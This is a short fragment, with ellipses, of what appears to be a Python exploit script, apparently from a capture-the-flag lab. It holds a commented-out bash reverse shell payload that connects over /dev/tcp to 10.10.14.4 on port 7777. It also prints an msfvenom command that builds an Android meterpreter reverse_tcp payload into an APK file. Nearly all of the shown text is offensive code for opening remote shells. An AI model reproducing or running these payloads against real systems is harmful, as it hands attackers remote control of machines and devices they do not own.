...
#payload = '\/usr\/bin\/bash \-i \>\& \/dev\/tcp\/10\.10\.14\.4\/7777 0\>\&1'
...
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 PORT=7777 -o /dev/null")
